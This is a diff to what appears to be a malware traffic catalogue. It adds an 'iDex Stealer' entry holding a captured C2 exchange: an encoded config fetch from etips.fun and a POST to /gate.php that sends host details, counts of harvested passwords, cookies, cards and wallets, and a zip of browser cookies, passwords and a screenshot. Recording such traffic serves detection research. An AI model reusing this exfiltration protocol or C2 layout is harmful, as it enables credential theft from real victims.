@@ -1233,6 +1233,160 @@ IHDR...............#&....sRGB.........gAMA......a....	pHYs..."...".........IDATx
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/icedidloader.png "IcedID Loader")
 
+#### iDex Stealer
+~~~
+GET /index.php HTTP/1.1
+Host: etips.fun
+Connection: Keep-Alive
+
+HTTP/1.1 200 OK
+Server: nginx-reuseport/1.13.4
+Date: Fri, 03 Apr 2020 12:43:55 GMT
+Content-Type: text/html
+Content-Length: 216
+Connection: keep-alive
+Keep-Alive: timeout=30
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.1.33
+Set-Cookie: PHPSESSID=f9eaff206353e78017c4257960c13590; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+
+YZAt44SJ3KsHldzHPnF8nveX4cBoS359sHzCXSUuwew/C6IEa7/zMjViaOVMK2EMfO1X+lcr24gD5S4LRuHREupBfWGdnGzfg5brXc1OuiMTRnOZ/iS9Vps9/B7Q+08m/137OU7V41UEx2QckwuZ9KeDTSjzmMv32Eewq0GUPiyQ5iFOOZ+8jGOXC1v8CsVqFfJYpKC2cCSLIQWDi6VzrQ==
+
+POST /gate.php HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accepts-Language: en-us,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------8d7d7ccad7ce23c
+Host: etips.fun
+Content-Length: 1191325
+Expect: 100-continue
+
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="hwid"
+
+EEEB5D54788042A7B542739BBC26CF4B
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="os"
+
+Windows 7 x64
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="platform"
+
+null
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="user"
+
+admin
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="passwordCount"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="coins"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="forms"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="cookies"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="ccCount"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="telegram"
+
+0
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="steam"
+
+null
+-----------------------------8d7d7ccad7ce23c
+Content-Disposition: form-data; name="logs"; filename="Archive.zip"
+Content-Type: zip
+
+PK........|e.P.R.y........=...Browsers/Cookies/Firefox Mozilla_nltxvmn2.default_Cookies.txt..]s.0.........r..b.V.Tk...CB.h......bggg........>y&..t2+u).26.>3.^..........(....$.C...o..n9.........P.4.fHTa9{OH.Q.I....?W...HG..&YC6
+..W.fR.9...x...E.r2..^.."....hM..|n.......e.Ef`+.P .!Lm....B.a.MQj..T.3W$..1....J..c.....n.. ..<j......Cz...@. ..4n...u-..{...\[.f.........#..t..^.F0D&6].Q.....%.~..IE...(qH..{.JT.K).B|......A.^..<..P....(..s..3.........)..........]A.......a}.D...L.|.t. ...N.eA...mF.;.5...C.<.G..9...A.G..lRMC.5..../..3/_L..H.x....N5....>..Zg!v;.....c..7r4.......X....(....}U.^...;.k.>....7PK........|e.P....i...Jr......Screenshot.png..w8[...o"v..G..Y#f..U]F......J.XE4}.......}...U...XuW.yq.|.....*.P....&.b.v.R.[......^.>..PK..........|e.P.R.y........=.................Browsers/Cookies/Firefox Mozilla_nltxvmn2.default_Cookies.txtPK..........}e.PpT.-.... ...+.................Browsers/Cookies/Chrome_Default_Cookies.txtPK..........|e.P....i...Jr................Y...Screenshot.pngPK..........}e.P?c .T...Z...
+.................Passwords.txtPK..........}e.P.s%.[...v.................m...Browsers.txtPK..........}e.PE.............................Information.txtPK....................iDex STEALER VERSION : 1.0.0
+==========================GEOIP Info==========================
+IP : 84.17.36.75
+ Country : Sweden
+CountryCode : SE
+Region : AB
+Region Name : Stockholm
+City : Stockholm
+Zip : 164 94
+TimeZone : Europe/Stockholm
+ISP : Datacamp Limited
+
+==========================Hardware Info==========================
+
+Username : admin
+PCName : USER-PC
+UUID : 00371-461-1206131-85808
+HWID : EEEB5D54788042A7B542739BBC26CF4B
+OS : Windows 7 x64
+CPU : Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz
+GPU : Standard VGA Graphics Adapter
+RAM : 4 GB
+MAC : 5254004AAD21
+Screen Resolution : 1280x720
+Layout Language : English (United States)
+PC Time : 4/3/2020 12:43:57 PM (UTC) Coordinated Universal Time
+
+==========================Program Info==========================
+Adobe Flash Player 27 ActiveX 27.0.0.187
+<redacted>
+Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.21.27702 14.21.27702.2
+
+
+==========================Program Info==========================
+svchost
+lsm
+svchost
+spoolsv
+svchost
+lsass
+dllhost
+SearchProtocolHost
+svchost
+csrss
+e197329d5376b93a60e67a43d5390a16dae5e813c2ee3708420a785d8b1b1a46
+csrss
+dwm
+services
+windanr
+wininit
+svchost
+SearchFilterHost
+taskhost
+svchost
+IMEDICTUPDATE
+SearchIndexer
+svchost
+explorer
+svchost
+OSPPSVC
+SearchProtocolHost
+svchost
+svchost
+winlogon
+smss
+System
+Idle
+
+-----------------------------8d7d7ccad7ce23c--
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex1.png "iDex")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex2.png "iDex")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/idex3.png "iDex")
+
 #### Imminent RAT
 ~~~
 00000000  06 00 00 00 81 13 14 6e 5b 69                     .......n [i
